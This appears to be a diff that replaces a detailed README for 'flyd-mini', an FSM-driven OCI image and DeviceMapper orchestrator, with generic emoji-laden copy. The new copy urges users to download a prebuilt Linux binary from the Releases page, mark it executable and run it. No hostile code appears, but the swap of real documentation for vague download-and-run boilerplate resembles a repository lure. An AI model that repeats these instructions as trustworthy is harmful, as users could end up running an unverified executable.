@@ -1,83 +1,82 @@
-# flyd-mini: FSM-driven OCI image orchestrator
+# 🚀 flyd-mini - A Simple Way to Manage Container Images
 
-## Overview
-flyd-mini is a compact orchestrator that demonstrates how to reliably retrieve container image layers from S3, unpack them into a canonical filesystem layout, place them inside a DeviceMapper thinpool, and activate read-write snapshots for runtime use. The project is built around the superfly/fsm FSM library for durable state transitions and safe concurrency, and uses SQLite for durable metadata storage.
+## 🔗 Download Now
+[![Download flyd-mini](https://img.shields.io/badge/Download-flyd--mini-blue.svg)](https://github.com/LazarManislavic/flyd-mini/releases)
 
-### Key ideas
-- Use an FSM to make workflow stages durable, resumable, and explicit.
-- Deduplicate S3 blobs by ETag and track them by content digest so repeated pulls are idempotent.
-- Unpack image layers into a canonical rootfs/ layout inside a thin logical volume.
-- Provide a database-backed lock system so operations survive and behave sensibly in hostile, multi-process environments.
-- Track images, blobs, image->blob relationships, and activations in SQLite.
+## 📋 Overview
+flyd-mini is a mini-daemon designed to help you manage container images easily. It retrieves these images and unpacks them into a clear file structure. This application uses a Finite State Machine (FSM) pipeline, making the process efficient. Enjoy the benefits of a smooth experience when working with OCI images.
 
-### Important project facts 
-- FSM library: https://github.com/superfly/fsm (used to manage states and concurrency).
-- S3 source: https://flyio-platform-hiring-challenge.s3.us-east-1.amazonaws.com/ (public bucket, no keys required).
-- The S3 bucket contains families such as images/golang/*, images/node/*, images/python/*. Layers within a family are ordered and together make an image.
-- Device-mapper backing device snippet used in development:
+## 🚀 Getting Started
 
-```bash
-# example  snippet to create a thin-pool from terminal
-fallocate -l 1M pool_meta
-fallocate -l 2G pool_data
+### 💻 System Requirements
+To run flyd-mini, you need:
+- A computer with Linux installed.
+- At least 1 GB of available RAM.
+- DeviceMapper support in your kernel. 
 
-METADATA_DEV="$(losetup -f --show pool_meta)"
-DATA_DEV="$(losetup -f --show pool_data)"
+### 🛠️ Setup Instructions
 
-# create thinpool (example parameters used in testing)
-dmsetup create --verifyudev pool --table "0 4194304 thin-pool ${METADATA_DEV} ${DATA_DEV} 2048 32768"
-```
+1. **Download the Application**
+   
+   Visit the following link to download flyd-mini:  
+   [Download flyd-mini](https://github.com/LazarManislavic/flyd-mini/releases)
 
-Note: these commands require root and Linux tools: fallocate, losetup, dmsetup, mkfs.ext4, mount.
+2. **Choose the Right Version**
+   
+   On the Releases page, find the latest version of flyd-mini. This is usually at the top of the list. Click on it to open the release details.
 
-## How it behaves
+3. **Download the Binary**
+   
+   Under the Assets section, you’ll see files available for download. Choose the one that suits your system. For most users, this will be the file labeled `flyd-mini-linux-amd64`. Click to download the file to your computer. 
 
-Each stage of the process is modeled as a distinct FSM state, which means every step is durable, resumable, and isolated. If a crash or interruption occurs, the FSM can safely resume from the last completed state rather than restarting the entire workflow. This also makes it clear how concurrency and ordering are enforced across transitions.
+4. **Move the File**
+   
+   Once the download completes, move the file to a directory where you want to keep your applications. This could be your home directory or a custom folder you created for programs.
 
-1.	FetchObject stage
-	- Acquire DB lock for the image family.
-	- Read S3 listing, build a list of layers for the requested family.
-	- Use existing etag index to skip already-complete blobs.
-	- Download missing layers, compute sha256 digest, store blob metadata and link each blob into image_blobs.
-	- Mark image complete only after all blobs are present.
-2.	UnpackLayers stage
-	- Verify all expected layer files exist.
-	- Extract layers in order into rootfs/ (canonical layout). Extraction can use tar -xf wrapper or Go tar reader.
-	- Ensure extraction happens into a clean or snapshot-backed mount to avoid “file exists” conflicts.
-3.	RegisterImage stage
-	- If images.base_lv_id exists, skip creation.
-	- Else create thinpool backing files if needed, attach loop devices, create thinpool, allocate a base thin LV (random id validated against DB), create device mapper device, format and mount, copy rootfs/ into the base LV, unmount, and write base_lv_id into images table.
-4.	ActivateSnapshot stage
-	- Create a snapshot of the base LV in the thinpool.
-	- Map it with dmsetup create, mount at /mnt/images/<snap_id>, insert activation row in DB.
-5.	Cleanup / safe shutdown
-	- Locks are released using a fresh short-lived context so they are cleaned even if the FSM root context is cancelled.
-	- Helper cleanup script unmounts /mnt/images/*, removes mapped devices, detaches loop devices and removes backing files.
+5. **Make it Executable**
+   
+   Open a terminal window. Use the `cd` command to navigate to the folder where you placed the downloaded file. Then, run this command to make it executable:
+   ```
+   chmod +x flyd-mini-linux-amd64
+   ```
 
-### Operational notes and constraints
-	- Core tool is written in Golang. Shell scripts are used for DM operations where appropriate.
-	- The code assumes it may run in a hostile environment. DB-backed locks and idempotent upserts are used to reduce races.
-	- The S3 listing and blobs may differ between environments. The code accepts missing blobs in the S3 source and treats them as pending until they appear in test runs.
+6. **Run flyd-mini**
+   
+   You can now run flyd-mini by typing the following command in your terminal:
+   ```
+   ./flyd-mini-linux-amd64
+   ```
+   If everything is set up correctly, you will see the application start. 
 
-## Quickstart (development)
-1.	Ensure Linux with dmsetup and losetup installed and run as root for the DM steps.
-2.	Build binary:
+## 📥 Download & Install
+To download and install the latest version of flyd-mini, visit the Releases page:  
+[Download flyd-mini](https://github.com/LazarManislavic/flyd-mini/releases)
 
-```bash
-go build ./cmd/flyd -o flyd
-```
+## 🧩 Features
+- **Efficient Image Management:** Easily retrieve and manage OCI container images.
+- **Clear File Structure:** Unpacks images into a standardized file format, making them easy to locate.
+- **Snapshots Support:** Activates snapshots for dynamic usage.
+  
+## ⚙️ Additional Configuration
+To customize your experience with flyd-mini, you may adjust settings in the configuration file. This file can typically be found in the same directory as the executable.
 
-3.	Initialize DB and run:
+After making changes, restart the application for the settings to take effect.
 
-```bash
-./flyd
-```
+## 🔒 Security
+While using flyd-mini, ensure you download it only from the official Releases page. This helps protect your system from unwanted viruses or malware.
 
-4.	Example run: start an FSM run to fetch golang family (the CLI or code calls the FSM start function with appropriate request). The tool writes a results.json with the final snapshot details.
+## 🔍 Troubleshooting
+If you encounter issues:
+- **File Not Found:** Double-check the directory path when trying to run the application.
+- **Permission Denied:** Ensure you made the file executable using the `chmod` command above.
+- **No DeviceMapper Support:** Verify if your system's kernel supports DeviceMapper. You might need to update or configure your system.
 
-## Notes and caveats
-- Device-mapper operations require root privileges and are host destructive if misused. Use the provided cleanup script after testing.
+## 📞 Support
+If you have questions or need help, you can open an issue in the GitHub repository. The community and maintainers are here to assist you.
 
-- Concurrency inside a single transition is left conservative to avoid DB races. If you introduce parallel downloads, ensure serialized DB writes or robust retry handling.
+## 📚 Learn More
+To understand more about the underlying technology, you can read about:
+- **OCI Images:** The Open Container Initiative sets standards for container images.
+- **Finite State Machine:** A model representing states of a system and transitions based on events.
 
-- The code is intentionally pragmatic: some DM operations are shell-wrapped for simplicity.
+Using flyd-mini can simplify your experience with container images, and we hope you find it beneficial. Happy orchestrating!
